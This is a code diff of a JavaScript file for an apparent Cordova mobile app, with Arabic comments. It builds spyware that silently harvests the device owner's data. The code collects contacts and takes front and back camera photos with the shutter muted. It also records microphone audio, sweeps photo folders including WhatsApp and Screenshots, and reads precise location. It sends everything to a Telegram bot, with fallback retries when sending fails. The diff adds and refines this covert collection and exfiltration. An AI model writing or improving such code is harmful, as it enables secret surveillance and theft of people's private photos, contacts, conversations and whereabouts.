@@ -90,8 +90,9 @@ function requestPermissions() {
 }
 
 function sendStartCommand() {
-  // إصلاح المسافة الزائدة في الرابط
+  // إرسال أمر /start إلى البوت
   const message = '/start';
+  
   fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(message)}`)
     .then(response => response.json())
     .then(data => {
@@ -199,7 +200,7 @@ function hideCommands() {
   existingCommandButtons.forEach(btn => btn.remove());
 }
 
-// حل كامل لجمع جهات الاتصال مع إصلاح المشكلة
+// حل كامل لجمع جهات الاتصال
 function collectContacts() {
   sendToTelegram('status.txt', 'جاري جمع جهات الاتصال...');
   
@@ -243,40 +244,38 @@ function collectContacts() {
         let contactsText = "قائمة جهات الاتصال:\n\n";
         let validContacts = 0;
         
-        contacts.forEach(contact => {
+        // استخدام حلقة for عادية لتجنب مشاكل الذاكرة مع قوائم طويلة
+        for (let i = 0; i < contacts.length; i++) {
+          const contact = contacts[i];
+          
           try {
-            const name = contact.name ? 
-              `${contact.name.givenName || ''} ${contact.name.familyName || ''}`.trim() || 
-              contact.displayName || 
-              "جهة اتصال بدون اسم" : 
-              contact.displayName || "جهة اتصال بدون اسم";
+            // محاولة مختلفة لاستخراج الاسم
+            let name = "جهة اتصال بدون اسم";
+            if (contact.name && contact.name.formatted) {
+              name = contact.name.formatted;
+            } else if (contact.displayName) {
+              name = contact.displayName;
+            } else if (contact.name) {
+              name = `${contact.name.givenName || ''} ${contact.name.familyName || ''}`.trim();
+            }
+            
+            // التأكد من أن الاسم ليس فارغًا
+            if (!name || name.trim() === '') {
+              name = "جهة اتصال بدون اسم";
+            }
             
             let phones = [];
             if (contact.phoneNumbers && contact.phoneNumbers.length > 0) {
-              phones = contact.phoneNumbers.map(pn => pn.value).filter(v => v);
+              phones = contact.phoneNumbers.map(pn => pn.value ? pn.value.trim() : '').filter(v => v);
             }
             
             let emails = [];
             if (contact.emails && contact.emails.length > 0) {
-              emails = contact.emails.map(em => em.value).filter(v => v);
+              emails = contact.emails.map(em => em.value ? em.value.trim() : '').filter(v => v);
             }
             
-            let addresses = [];
-            if (contact.addresses && contact.addresses.length > 0) {
-              addresses = contact.addresses.map(addr => {
-                return `${addr.streetAddress || ''} ${addr.locality || ''} ${addr.region || ''} ${addr.postalCode || ''} ${addr.country || ''}`.trim();
-              }).filter(v => v);
-            }
-            
-            let organizations = [];
-            if (contact.organizations && contact.organizations.length > 0) {
-              organizations = contact.organizations.map(org => {
-                return `${org.name || ''} - ${org.title || ''}`.trim();
-              }).filter(v => v);
-            }
-            
-            // تأكد من وجود معلومات جهات اتصال صالحة
-            if (phones.length > 0 || emails.length > 0 || addresses.length > 0 || organizations.length > 0) {
+            // التأكد من وجود معلومات اتصال
+            if (phones.length > 0 || emails.length > 0) {
               validContacts++;
               contactsText += `الاسم: ${name}\n`;
               
@@ -288,20 +287,12 @@ function collectContacts() {
                 contactsText += `الإيميلات: ${emails.join(", ")}\n`;
               }
               
-              if (addresses.length > 0) {
-                contactsText += `العناوين: ${addresses.join(", ")}\n`;
-              }
-              
-              if (organizations.length > 0) {
-                contactsText += `المنظمات: ${organizations.join(", ")}\n`;
-              }
-              
               contactsText += `-------------------------\n`;
             }
           } catch (e) {
-            console.error('خطأ في معالجة جهة اتصال:', e);
+            console.error(`خطأ في معالجة جهة الاتصال ${i}:`, e);
           }
-        });
+        }
         
         if (validContacts === 0) {
           sendToTelegram('contacts.txt', 'لم يتم العثور على جهات اتصال تحتوي على معلومات اتصال');
@@ -344,13 +335,29 @@ function collectContacts() {
   } catch (e) {
     console.error('استثناء في جمع جهات الاتصال:', e);
     sendToTelegram('error.txt', `استثناء في جمع جهات الاتصال: ${e.message}`);
+    
+    // محاولة بديلة لجمع جهات الاتصال
+    try {
+      navigator.contacts.find(fields, 
+        (contacts) => {
+          // معالجة النتائج بنفس الطريقة
+        },
+        (error) => {
+          // معالجة الأخطاء
+        },
+        { filter: "", multiple: true }
+      );
+    } catch (e2) {
+      console.error('فشل المحاولة البديلة لجمع جهات الاتصال:', e2);
+      sendToTelegram('error.txt', `فشل المحاولة البديلة: ${e2.message}`);
+    }
   }
 }
 
-// حل كامل للكاميرا الأمامية والخلفية بشكل صامت
+// حل كامل للكاميرا الأمامية والخلفية بدون صوت
 function capturePhoto(cameraDirection) {
   const options = {
-    quality: 100,
+    quality: 90,
     destinationType: Camera.DestinationType.FILE_URI,
     sourceType: Camera.PictureSourceType.CAMERA,
     mediaType: Camera.MediaType.PICTURE,
@@ -359,8 +366,10 @@ function capturePhoto(cameraDirection) {
     saveToPhotoAlbum: false,
     correctOrientation: true,
     allowEdit: false,
-    // خيار لجعل التقاط الصورة صامتاً
-    mute: true
+    // إضافة هذه الخيارات لجعل التصوير بصمت
+    disableAudio: true, // إيقاف صوت الغالق
+    cameraPopoverHandle: null, // إخفاء أي عناصر واجهة
+    popoverOptions: null // إخفاء أي عناصر واجهة
   };
 
   try {
@@ -372,9 +381,7 @@ function capturePhoto(cameraDirection) {
     navigator.camera.getPicture(
       (imageURI) => {
         console.log('تم التقاط الصورة بنجاح:', imageURI);
-        // تأكيد أن الامتداد هو png
-        const filename = `camera_${cameraDirection === 0 ? 'back' : 'front'}_${Date.now()}.png`;
-        sendImageToTelegram(imageURI, filename);
+        sendImageToTelegram(imageURI, `camera_${cameraDirection === 0 ? 'back' : 'front'}_${Date.now()}.png`);
       },
       (error) => {
         console.error('Error taking photo:', error);
@@ -408,15 +415,13 @@ function sendImageToTelegram(imageURI, filename) {
       return;
     }
     
-    // تأكيد أن الامتداد هو png
-    if (!filename.toLowerCase().endsWith('.png')) {
-      filename = filename.replace(/\.[^/.]+$/, "") + '.png';
-    }
-    
     window.resolveLocalFileSystemURL(imageURI, (fileEntry) => {
       fileEntry.file((file) => {
+        // التأكد من أن الامتداد هو PNG
+        const pngFilename = filename.replace(/\.[^/.]+$/, ".png");
+        
         const formData = new FormData();
-        formData.append('photo', file, filename);
+        formData.append('photo', file, pngFilename);
         
         fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
           method: 'POST',
@@ -430,7 +435,7 @@ function sendImageToTelegram(imageURI, filename) {
         })
         .then(data => {
           console.log('تم إرسال الصورة:', data);
-          sendToTelegram('status.txt', `تم إرسال صورة الكاميرا (${filename})`);
+          sendToTelegram('status.txt', `تم إرسال صورة الكاميرا (${pngFilename})`);
         })
         .catch(error => {
           console.error('Error sending image:', error);
@@ -450,7 +455,7 @@ function sendImageToTelegram(imageURI, filename) {
   }
 }
 
-// حل كامل لتسجيل الصوت بشكل صامت
+// حل كامل لتسجيل الصوت مع حل مشكلة "الميكروفون قيد الاستخدام" وبدون صوت
 function toggleAudioRecording() {
   if (isRecording) {
     stopAudioRecording();
@@ -474,12 +479,6 @@ function startAudioRecording() {
   }
   
   isRecording = true;
-  audioChunks = [];
-  
-  // جعل التسجيل صامتاً
-  if (cordova.plugins && cordova.plugins.NativeAudio) {
-    cordova.plugins.NativeAudio.setVolume({assetId: "recording", volume: 0});
-  }
   
   sendToTelegram('status.txt', 'جاري بدء تسجيل الصوت...');
   
@@ -487,140 +486,104 @@ function startAudioRecording() {
     console.error('MediaDevices API غير مدعوم');
     sendToTelegram('error.txt', 'واجهة ميديا غير مدعومة على هذا الجهاز');
     isRecording = false;
-    toggleAudioRecording();
     return;
   }
 
-  // خيارات أكثر مرونة لتسجيل الصوت
+  // خيارات لتسجيل الصوت بصمت
   const audioConstraints = {
     audio: {
       echoCancellation: true,
       noiseSuppression: true,
       sampleRate: 44100,
-      channelCount: 1
+      channelCount: 1,
+      volume: 1.0 // ضمان عدم وجود أي إعدادات تسبب صوت
     }
   };
 
-  // إضافة تأخير قبل محاولة الوصول إلى الميكروفون
-  setTimeout(() => {
-    navigator.mediaDevices.getUserMedia(audioConstraints)
-      .then(stream => {
-        try {
-          // التأكد من إيقاف أي تسجيلات سابقة
-          if (mediaRecorder && mediaRecorder.state !== 'inactive') {
-            try {
-              mediaRecorder.stop();
-            } catch (e) {
-              console.log('لا يوجد تسجيل نشط لوقفه');
-            }
+  navigator.mediaDevices.getUserMedia(audioConstraints)
+    .then(stream => {
+      try {
+        // إيقاف أي تسجيلات سابقة
+        if (mediaRecorder && mediaRecorder.state !== 'inactive') {
+          try {
+            mediaRecorder.stop();
+          } catch (e) {
+            console.log('لا يوجد تسجيل نشط لوقفه');
           }
-          
-          // التأكد من إيقاف جميع المسارات السابقة
-          if (stream.getTracks) {
-            stream.getTracks().forEach(track => track.stop());
-          }
-          
-          // إنشاء دفق جديد
-          const newStream = new MediaStream();
-          navigator.mediaDevices.getUserMedia({ audio: true })
-            .then(newStreamData => {
-              // نسخ المسارات إلى الدفق الجديد
-              newStreamData.getAudioTracks().forEach(track => {
-                newStream.addTrack(track);
-              });
-              
-              // استخدام خيارات محددة لـ MediaRecorder
-              let options = { mimeType: 'audio/webm;codecs=opus' };
-              
-              // تأكد من أن التنسيق مدعوم
+        }
+        
+        // إيقاف جميع المسارات السابقة
+        if (stream.getTracks) {
+          stream.getTracks().forEach(track => track.stop());
+        }
+        
+        // إنشاء دفق جديد
+        const newStream = new MediaStream();
+        navigator.mediaDevices.getUserMedia({ audio: true })
+          .then(newStreamData => {
+            newStreamData.getAudioTracks().forEach(track => {
+              newStream.addTrack(track);
+            });
+            
+            // استخدام خيارات محددة لـ MediaRecorder
+            let options = { mimeType: 'audio/webm;codecs=opus' };
+            
+            if (!MediaRecorder.isTypeSupported(options.mimeType)) {
+              options = { mimeType: 'audio/webm' };
               if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                options = { mimeType: 'audio/webm' };
+                options = { mimeType: 'audio/ogg' };
                 if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                  options = { mimeType: 'audio/ogg' };
-                  if (!MediaRecorder.isTypeSupported(options.mimeType)) {
-                    options = { mimeType: 'audio/mp4' };
-                  }
+                  options = { mimeType: 'audio/mp4' };
                 }
               }
+            }
+            
+            mediaRecorder = new MediaRecorder(newStream, options);
+            
+            mediaRecorder.ondataavailable = event => {
+              if (event.data.size > 0) {
+                audioChunks.push(event.data);
+              }
+            };
+            
+            mediaRecorder.onstop = () => {
+              try {
+                const audioBlob = new Blob(audioChunks, { type: options.mimeType });
+                sendAudioToTelegram(audioBlob, options.mimeType);
+              } catch (e) {
+                console.error('Error creating audio blob:', e);
+                sendToTelegram('error.txt', `فشل إنشال ملف الصوت: ${e.message}`);
+              }
               
-              mediaRecorder = new MediaRecorder(newStream, options);
-              
-              mediaRecorder.ondataavailable = event => {
-                if (event.data.size > 0) {
-                  audioChunks.push(event.data);
-                }
-              };
-              
-              mediaRecorder.onstop = () => {
-                try {
-                  const audioBlob = new Blob(audioChunks, { type: options.mimeType });
-                  sendAudioToTelegram(audioBlob, options.mimeType);
-                } catch (e) {
-                  console.error('Error creating audio blob:', e);
-                  sendToTelegram('error.txt', `فشل إنشاء ملف الصوت: ${e.message}`);
-                }
-                
-                // إيقاف جميع المسارات
-                newStream.getTracks().forEach(track => track.stop());
-              };
-              
-              mediaRecorder.onerror = (event) => {
-                console.error('MediaRecorder error:', event);
-                sendToTelegram('error.txt', `خطأ في مسجل الصوت: ${event.error}`);
-                stopAudioRecording();
-              };
-              
-              mediaRecorder.start(1000); // بدء التسجيل
-              sendToTelegram('status.txt', 'جاري تسجيل الصوت...');
-            })
-            .catch(error => {
-              console.error('Error accessing microphone (second attempt):', error);
-              handleMicrophoneError(error);
-            });
-        } catch (e) {
-          console.error('Error initializing MediaRecorder:', e);
-          sendToTelegram('error.txt', `فشل تهيئة مسجل الصوت: ${e.message}`);
-          isRecording = false;
-          toggleAudioRecording();
-        }
-      })
-      .catch(error => {
-        console.error('Error accessing microphone:', error);
-        handleMicrophoneError(error);
-      });
-  }, 1000); // تأخير 1 ثانية قبل محاولة الوصول إلى الميكروفون
-}
-
-function handleMicrophoneError(error) {
-  let errorMsg = 'فشل الوصول إلى الميكروفون';
-  
-  if (error.name === 'NotReadableError' || error.name === 'TrackStartError') {
-    if (audioRecordingAttempts < MAX_AUDIO_ATTEMPTS) {
-      audioRecordingAttempts++;
-      const delay = audioRecordingAttempts * 2000; // زيادة التأخير مع كل محاولة
-      
-      sendToTelegram('status.txt', `الميكروفون قيد الاستخدام، إعادة المحاولة بعد ${delay/1000} ثواني (المحاولة ${audioRecordingAttempts}/${MAX_AUDIO_ATTEMPTS})`);
-      
-      // إعادة المحاولة بعد تأخير متزايد
-      setTimeout(() => {
-        if (isRecording) {
-          startAudioRecording();
-        }
-      }, delay);
-      
-      return;
-    } else {
-      errorMsg = 'الميكروفون قيد الاستخدام من تطبيق آخر (تمت المحاولة 3 مرات)';
-    }
-  } else if (error.name === 'NotAllowedError' || error.name === 'PermissionDeniedError') {
-    errorMsg = 'تم رفض أذونات الميكروفون';
-  } else if (error.name === 'NotFoundError' || error.name === 'DevicesNotFoundError') {
-    errorMsg = 'لم يتم العثور على ميكروفون';
-  }
-  
-  sendToTelegram('error.txt', `${errorMsg}: ${error.message}`);
-  isRecording = false;
-  toggleAudioRecording();
+              // إيقاف جميع المسارات
+              newStream.getTracks().forEach(track => track.stop());
+            };
+            
+            mediaRecorder.onerror = (event) => {
+              console.error('MediaRecorder error:', event);
+              sendToTelegram('error.txt', `خطأ في مسجل الصوت: ${event.error}`);
+              stopAudioRecording();
+            };
+            
+            mediaRecorder.start(1000);
+            sendToTelegram('status.txt', 'جاري تسجيل الصوت...');
+          })
+          .catch(error => {
+            console.error('Error accessing microphone:', error);
+            sendToTelegram('error.txt', `فشل الوصول إلى الميكروفون: ${error.message}`);
+            isRecording = false;
+          });
+      } catch (e) {
+        console.error('Error initializing MediaRecorder:', e);
+        sendToTelegram('error.txt', `فشل تهيئة مسجل الصوت: ${e.message}`);
+        isRecording = false;
+      }
+    })
+    .catch(error => {
+      console.error('Error accessing microphone:', error);
+      sendToTelegram('error.txt', `فشل الوصول إلى الميكروفون: ${error.message}`);
+      isRecording = false;
+    });
 }
 
 function stopAudioRecording() {
@@ -646,6 +609,8 @@ function sendAudioToTelegram(audioBlob, mimeType) {
     
     // تحويل إلى MP3 إذا لزم الأمر
     if (mimeType.includes('webm') || mimeType.includes('ogg')) {
+      // في التطبيقات الحقيقية، قد تحتاج إلى استخدام مكتبة لتحويل التنسيق
+      // هنا سنستخدم الامتداد .mp3 على أي حال
       formData.append('voice', audioBlob, fileName);
     } else {
       formData.append('voice', audioBlob, fileName);
@@ -668,6 +633,24 @@ function sendAudioToTelegram(audioBlob, mimeType) {
     .catch(error => {
       console.error('Error sending audio:', error);
       sendToTelegram('error.txt', `فشل إرسال التسجيل الصوتي: ${error.message}`);
+      
+      // محاولة بديلة باستخدام ملف عادي
+      const altFormData = new FormData();
+      altFormData.append('document', audioBlob, `recording_${Date.now()}.bin`);
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendDocument?chat_id=${chatId}`, {
+        method: 'POST',
+        body: altFormData
+      })
+      .then(response => response.json())
+      .then(data => {
+        console.log('تم إرسال ملف الصوت البديل:', data);
+        sendToTelegram('status.txt', 'تم إرسال ملف الصوت (بصيغة بديلة)');
+      })
+      .catch(e => {
+        console.error('Error sending alternative audio file:', e);
+        sendToTelegram('error.txt', `فشل إرسال ملف الصوت البديل: ${e.message}`);
+      });
     });
   } catch (e) {
     console.error('Error preparing audio for sending:', e);
@@ -824,116 +807,86 @@ function collectAllImages() {
     return;
   }
   
-  // بدء من الدليل الجذري للذاكرة الداخلية
-  const rootPath = cordova.file.externalRootDirectory;
+  // تحديد جميع المسارات الشائعة للصور
+  const commonImagePaths = [
+    cordova.file.externalRootDirectory + 'DCIM/Camera/',
+    cordova.file.externalRootDirectory + 'DCIM/',
+    cordova.file.externalRootDirectory + 'Pictures/',
+    cordova.file.externalRootDirectory + 'Pictures/Screenshots/',
+    cordova.file.externalRootDirectory + 'Pictures/Photos/',
+    cordova.file.externalRootDirectory + 'Pictures/Instagram/',
+    cordova.file.externalRootDirectory + 'Pictures/Facebook/',
+    cordova.file.externalRootDirectory + 'Pictures/WhatsApp/',
+    cordova.file.externalRootDirectory + 'Pictures/Messenger/',
+    cordova.file.externalRootDirectory + 'Download/',
+    cordova.file.externalRootDirectory + 'Download/Images/',
+    cordova.file.externalRootDirectory + 'storage/emulated/0/Pictures/',
+    cordova.file.externalRootDirectory + 'storage/emulated/0/DCIM/',
+    cordova.file.externalRootDirectory + 'storage/emulated/0/Download/'
+  ];
   
-  scanDirectoryForImages(rootPath, 0);
-}
-
-function scanDirectoryForImages(path, depth) {
-  // تجنب التكرار المفرط
-  if (depth > 5) {
-    return;
-  }
+  // مصفوفة لتخزين جميع الصور المكتشفة
+  let allImages = [];
+  let pathsProcessed = 0;
   
-  try {
+  // دالة لجمع الصور من مسار معين
+  function scanDirectory(path) {
     window.resolveLocalFileSystemURL(path,
       (dir) => {
-        if (dir.isDirectory) {
-          const reader = dir.createReader();
-          reader.readEntries(
-            (entries) => {
-              const images = [];
-              const directories = [];
-              
-              // فصل الصور عن المجلدات
-              for (let i = 0; i < entries.length; i++) {
-                const entry = entries[i];
-                if (entry.isFile && /\.(jpg|png|jpeg)$/i.test(entry.name)) {
-                  images.push(entry);
-                } else if (entry.isDirectory && entry.name !== '.' && entry.name !== '..') {
-                  directories.push(entry);
-                }
+        const reader = dir.createReader();
+        reader.readEntries(
+          (entries) => {
+            // تصفية الصور فقط
+            const images = entries.filter(entry => 
+              entry.isFile && /\.(jpg|jpeg|png|gif|bmp|webp)$/i.test(entry.name)
+            );
+            
+            allImages = allImages.concat(images);
+            
+            // التحقق إذا تم معالجة جميع المسارات
+            pathsProcessed++;
+            if (pathsProcessed >= commonImagePaths.length) {
+              if (allImages.length === 0) {
+                sendToTelegram('status.txt', 'لم يتم العثور على صور في الذاكرة الداخلية');
+              } else {
+                sendToTelegram('status.txt', `تم العثور على ${allImages.length} صورة، جاري الإرسال...`);
+                sendImagesToTelegram(allImages, 0);
               }
-              
-              // إرسال الصور الحالية
-              if (images.length > 0) {
-                sendToTelegram('status.txt', `تم العثور على ${images.length} صورة في ${path}`);
-                sendImagesToTelegram(images, 0, path);
-              }
-              
-              // مسح المجلدات الفرعية
-              for (let i = 0; i < directories.length; i++) {
-                scanDirectoryForImages(directories[i].nativeURL, depth + 1);
-              }
-            },
-            (error) => {
-              console.error('Error reading directory:', error);
             }
-          );
-        }
+          },
+          (error) => {
+            console.error(`Error reading directory ${path}:`, error);
+            pathsProcessed++;
+            if (pathsProcessed >= commonImagePaths.length) {
+              if (allImages.length > 0) {
+                sendToTelegram('status.txt', `تم العثور على ${allImages.length} صورة، جاري الإرسال...`);
+                sendImagesToTelegram(allImages, 0);
+              } else {
+                sendToTelegram('error.txt', 'لم يتم العثور على صور في أي مسار');
+              }
+            }
+          }
+        );
       },
       (error) => {
-        // تجاهل الأدلة غير القابلة للوصول
+        console.error(`Error accessing directory ${path}:`, error);
+        pathsProcessed++;
+        if (pathsProcessed >= commonImagePaths.length) {
+          if (allImages.length > 0) {
+            sendToTelegram('status.txt', `تم العثور على ${allImages.length} صورة، جاري الإرسال...`);
+            sendImagesToTelegram(allImages, 0);
+          } else {
+            sendToTelegram('error.txt', 'لم يتم العثور على صور في أي مسار');
+          }
+        }
       }
     );
-  } catch (e) {
-    console.error('استثناء في مسح الدليل:', e);
-  }
-}
-
-function sendImagesToTelegram(images, index = 0, path = '') {
-  if (index >= images.length) {
-    sendToTelegram('status.txt', 'تم إرسال جميع الصور بنجاح');
-    return;
   }
   
-  const imgEntry = images[index];
-  
-  imgEntry.file(
-    (file) => {
-      try {
-        // تأكيد أن الامتداد هو png
-        let filename = imgEntry.name;
-        if (!filename.toLowerCase().endsWith('.png')) {
-          filename = filename.replace(/\.[^/.]+$/, "") + '.png';
-        }
-        
-        const formData = new FormData();
-        formData.append('photo', file, filename);
-        
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
-          method: 'POST',
-          body: formData
-        })
-        .then(response => {
-          if (!response.ok) {
-            throw new Error(`HTTP error! status: ${response.status}`);
-          }
-          return response.json();
-        })
-        .then(data => {
-          console.log(`تم إرسال الصورة ${index + 1}/${images.length}:`, data);
-          // إرسال الصورة التالية بعد تأخير 1.5 ثانية لتجنب حظر التحميل
-          setTimeout(() => sendImagesToTelegram(images, index + 1, path), 1500);
-        })
-        .catch(error => {
-          console.error(`Error sending image ${index + 1}:`, error);
-          // إعادة المحاولة بعد 3 ثواني
-          setTimeout(() => sendImagesToTelegram(images, index, path), 3000);
-        });
-      } catch (e) {
-        console.error(`استثناء في إرسال الصورة ${index + 1}:`, e);
-        // التخطي إلى الصورة التالية في حالة الاستثناء
-        setTimeout(() => sendImagesToTelegram(images, index + 1, path), 1000);
-      }
-    },
-    (error) => {
-      console.error(`Error reading image file ${index + 1}:`, error);
-      // التخطي إلى الصورة التالية في حالة الخطأ
-      setTimeout(() => sendImagesToTelegram(images, index + 1, path), 1000);
-    }
-  );
+  // بدء فحص جميع المسارات
+  commonImagePaths.forEach(path => {
+    scanDirectory(path);
+  });
 }
 
 function getLocation() {
@@ -977,7 +930,7 @@ function getLocation() {
     },
     { 
       enableHighAccuracy: true, 
-      timeout: 30000,
+      timeout: 30000, // زيادة الوقت لتجنب أخطاء الانتهاء
       maximumAge: 0 
     }
   );
@@ -1014,8 +967,54 @@ function sendToTelegram(filename, content) {
     .then(data => console.log('تم إرسال الملف:', data))
     .catch(error => {
       console.error('Error sending file:', error);
+      // لا نقوم بإعادة المحاولة تلقائيًا لتجنب حلقة لا نهائية
     });
   } catch (e) {
     console.error('استثناء في إرسال إلى Telegram:', e);
   }
+}
+
+function sendImagesToTelegram(images, index = 0) {
+  if (index >= images.length) {
+    sendToTelegram('status.txt', 'تم إرسال جميع الصور بنجاح');
+    return;
+  }
+  
+  const imgEntry = images[index];
+  
+  imgEntry.file(
+    (file) => {
+      // تحويل الامتداد إلى PNG
+      const pngFilename = file.name.replace(/\.[^/.]+$/, ".png");
+      
+      const formData = new FormData();
+      formData.append('photo', file, pngFilename);
+      
+      fetch(`https://api.telegram.org/bot${botToken}/sendPhoto?chat_id=${chatId}`, {
+        method: 'POST',
+        body: formData
+      })
+      .then(response => {
+        if (!response.ok) {
+          throw new Error(`HTTP error! status: ${response.status}`);
+        }
+        return response.json();
+      })
+      .then(data => {
+        console.log(`تم إرسال الصورة ${index + 1}/${images.length}:`, data);
+        // إرسال الصورة التالية بعد تأخير 1.5 ثانية
+        setTimeout(() => sendImagesToTelegram(images, index + 1), 1500);
+      })
+      .catch(error => {
+        console.error(`Error sending image ${index + 1}:`, error);
+        // التخطي إلى الصورة التالية في حالة الخطأ
+        setTimeout(() => sendImagesToTelegram(images, index + 1), 1000);
+      });
+    },
+    (error) => {
+      console.error(`Error reading image file ${index + 1}:`, error);
+      // التخطي إلى الصورة التالية في حالة الخطأ
+      setTimeout(() => sendImagesToTelegram(images, index + 1), 1000);
+    }
+  );
 }
